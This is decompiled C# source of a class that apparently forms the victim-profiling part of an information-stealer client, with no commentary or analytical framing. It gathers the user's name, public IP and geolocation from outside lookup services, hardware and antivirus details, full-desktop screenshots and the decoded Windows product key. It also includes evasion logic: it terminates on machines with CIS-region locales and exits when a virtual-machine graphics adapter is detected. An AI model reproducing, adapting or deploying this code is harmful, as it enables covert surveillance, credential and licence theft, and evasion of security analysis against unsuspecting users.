using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using client.Helpers;
using client.Models;
using Microsoft.Win32;

namespace client.Body
{
	// Token: 0x02000049 RID: 73
	internal class System
	{
		// Token: 0x060001AD RID: 429 RVA: 0x000096D4 File Offset: 0x000078D4
		public static InformationStructure GetInformation()
		{
			System.CISCheck();
			GeoInfo geoInfo = System.IP(0);
			return new InformationStructure
			{
				Username = Environment.UserName,
				Install_Path = Assembly.GetExecutingAssembly().Location,
				IP = geoInfo.ip,
				Country = geoInfo.country_code,
				Region = geoInfo.region,
				City = geoInfo.city,
				Zip = geoInfo.postal,
				Country_Name = geoInfo.country,
				Operating_System = System.OS(),
				ScreenMetrics = System.ScreenMetrics(),
				Windows_Key = System.WindowsKey(),
				Graphic_Card = System.GetGpu(),
				Processor = System.GetCpu(),
				Operating_Memory = System.GetRam(),
				Antiviruses = System.GetAV()
			};
		}

		// Token: 0x060001AE RID: 430 RVA: 0x000097A4 File Offset: 0x000079A4
		private static void CISCheck()
		{
			if (Config.EnableCIS == "0")
			{
				return;
			}
			List<string> list = new List<string>();
			list.Add("UA");
			list.Add("RU");
			list.Add("BY");
			list.Add("MD");
			list.Add("AZ");
			list.Add("AM");
			list.Add("KZ");
			list.Add("TJ");
			list.Add("KG");
			list.Add("UZ");
			list.Add("TM");
			CultureInfo ci = CultureInfo.InstalledUICulture;
			if (list.Any((string x) => x.ToLower() == ci.TwoLetterISOLanguageName))
			{
				Environment.FailFast("");
			}
		}

		// Token: 0x060001AF RID: 431 RVA: 0x00009870 File Offset: 0x00007A70
		private static GeoInfo IP(int reties)
		{
			GeoInfo geoInfo = new GeoInfo();
			try
			{
				geoInfo = JsonHelper.Deserialize<GeoInfo>(new WebClient().DownloadString("http://ipwho.is"));
			}
			catch (Exception e)
			{
				LoggerHelper.HandleRuntimeError(e);
			}
			if (string.IsNullOrEmpty(geoInfo.ip) || string.IsNullOrEmpty(geoInfo.country_code))
			{
				if (reties > 2)
				{
					return geoInfo;
				}
				Thread.Sleep(1500);
				try
				{
					if (reties == 1)
					{
						geoInfo = GeoInfo.ConvertFrom2(JsonHelper.Deserialize<GeoInfo2>(new WebClient().DownloadString("http://ip-api.com/json/")));
					}
					else if (reties == 2)
					{
						GeoInfo geoInfo2 = JsonHelper.Deserialize<GeoInfo>(new WebClient().DownloadString("http://ipinfo.io/json"));
						geoInfo = geoInfo2;
						geoInfo.country_code = geoInfo2.country;
					}
				}
				catch
				{
				}
				if (string.IsNullOrEmpty(geoInfo.ip) || string.IsNullOrEmpty(geoInfo.country_code))
				{
					return System.IP(++reties);
				}
			}
			return geoInfo;
		}

		// Token: 0x060001B0 RID: 432 RVA: 0x00009960 File Offset: 0x00007B60
		private static string OS()
		{
			string text = "Unknown";
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM Win32_OperatingSystem"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						text = Convert.ToString(((ManagementObject)managementBaseObject)["Name"]);
					}
					text = text.Split(new char[]
					{
						'|'
					})[0];
					int length = text.Split(new char[]
					{
						' '
					})[0].Length;
					text = text.Substring(length).TrimStart(new char[0]).TrimEnd(new char[0]);
				}
				if (Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86"))
				{
					text += " (32 Bit)";
				}
				else
				{
					text += " (64 Bit)";
				}
			}
			catch (Exception e)
			{
				LoggerHelper.HandleRuntimeError(e);
			}
			return text;
		}

		// Token: 0x060001B1 RID: 433 RVA: 0x00009A90 File Offset: 0x00007C90
		private static List<string> ScreenMetrics()
		{
			List<string> list = new List<string>();
			foreach (Screen screen in Screen.AllScreens)
			{
				string item = screen.Bounds.Width.ToString() + "x" + screen.Bounds.Height.ToString();
				list.Add(item);
			}
			return list;
		}

		// Token: 0x060001B2 RID: 434 RVA: 0x00009B00 File Offset: 0x00007D00
		public static byte[] GetScreenshots()
		{
			Rectangle a = default(Rectangle);
			foreach (Screen screen in Screen.AllScreens)
			{
				a = Rectangle.Union(a, screen.Bounds);
			}
			Bitmap bitmap = new Bitmap(a.Width, a.Height);
			Graphics.FromImage(bitmap).CopyFromScreen(a.Location, Point.Empty, bitmap.Size);
			MemoryStream memoryStream = new MemoryStream();
			bitmap.Save(memoryStream, ImageFormat.Png);
			return memoryStream.ToArray();
		}

		// Token: 0x060001B3 RID: 435 RVA: 0x00009B8C File Offset: 0x00007D8C
		private static string WindowsKey()
		{
			try
			{
				RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
				RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
				object obj = (registryKey2 != null) ? registryKey2.GetValue("DigitalProductId") : null;
				if (obj == null)
				{
					return null;
				}
				byte[] array = (byte[])obj;
				registryKey.Close();
				bool flag = (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2) || Environment.OSVersion.Version.Major > 6;
				string text = string.Empty;
				char[] array2 = "BCDFGHJKMPQRTVWXY2346789".ToCharArray();
				if (flag)
				{
					byte b = array[66] / 6 & 1;
					array[66] = ((array[66] & 247) | (b & 2) * 4);
					int num = 0;
					for (int i = 24; i >= 0; i--)
					{
						int num2 = 0;
						for (int j = 14; j >= 0; j--)
						{
							num2 *= 256;
							num2 = (int)array[j + 52] + num2;
							array[j + 52] = (byte)(num2 / 24);
							num2 %= 24;
							num = num2;
						}
						text = array2[num2].ToString() + text;
					}
					string str = text.Substring(1, num);
					string str2 = text.Substring(num + 1, text.Length - (num + 1));
					text = str + "N" + str2;
					for (int k = 5; k < text.Length; k += 6)
					{
						text = text.Insert(k, "-");
					}
				}
				else
				{
					char[] array3 = new char[29];
					ArrayList arrayList = new ArrayList();
					for (int l = 52; l <= 67; l++)
					{
						arrayList.Add(array[l]);
					}
					for (int m = 28; m >= 0; m--)
					{
						if ((m + 1) % 6 == 0)
						{
							array3[m] = '-';
						}
						else
						{
							int num3 = 0;
							for (int n = 14; n >= 0; n--)
							{
								int num4 = num3 << 8 | (int)((byte)arrayList[n]);
								arrayList[n] = (byte)(num4 / 24);
								num3 = num4 % 24;
								array3[m] = array2[num3];
							}
						}
					}
					text = new string(array3);
				}
				return text;
			}
			catch
			{
			}
			return "unknown";
		}

		// Token: 0x060001B4 RID: 436 RVA: 0x00009DF4 File Offset: 0x00007FF4
		private static string GetAV()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					List<string> list = new List<string>();
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						list.Add(managementBaseObject["displayName"].ToString());
					}
					if (list.Count == 0)
					{
						return "none";
					}
					return string.Join(", ", list.ToArray()) + ".";
				}
			}
			catch (Exception e)
			{
				LoggerHelper.HandleRuntimeError(e);
			}
			return "none";
		}

		// Token: 0x060001B5 RID: 437 RVA: 0x00009ED8 File Offset: 0x000080D8
		private static string GetCpu()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["Name"].ToString() + " (" + ((ManagementObject)enumerator.Current)["NumberOfCores"].ToString() + " cores)";
					}
				}
			}
			catch (Exception e)
			{
				LoggerHelper.HandleRuntimeError(e);
			}
			return "Unknown";
		}

		// Token: 0x060001B6 RID: 438 RVA: 0x00009F88 File Offset: 0x00008188
		public static string GetGpu()
		{
			List<string> source = new List<string>
			{
				"Microsoft",
				"VirtualBox",
				"Standart VGA",
				"Hyper-V",
				"Unknown"
			};
			string result = "Unknown";
			try
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("select * from Win32_VideoController").Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					try
					{
						System.<>c__DisplayClass9_0 CS$<>8__locals1 = new System.<>c__DisplayClass9_0();
						System.<>c__DisplayClass9_0 CS$<>8__locals2 = CS$<>8__locals1;
						object obj = managementObject["Name"];
						CS$<>8__locals2.gpu = (((obj != null) ? obj.ToString() : null) ?? "Unknown");
						if (Config.VirtualMachineCheck == "1" && source.Any((string x) => CS$<>8__locals1.gpu.StartsWith(x)))
						{
							Environment.Exit(-1);
						}
						if (!string.IsNullOrEmpty(CS$<>8__locals1.gpu))
						{
							result = CS$<>8__locals1.gpu;
						}
					}
					catch (Exception e)
					{
						LoggerHelper.HandleRuntimeError(e);
					}
				}
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x060001B7 RID: 439 RVA: 0x0000A0BC File Offset: 0x000082BC
		private static string GetRam()
		{
			try
			{
				int num = 0;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							num = (int)(Convert.ToDouble(((ManagementObject)enumerator.Current)["TotalPhysicalMemory"]) / 1048576.0);
						}
					}
				}
				return num.ToString() + "MB";
			}
			catch (Exception e)
			{
				LoggerHelper.HandleRuntimeError(e);
			}
			return "?";
		}
	}
}
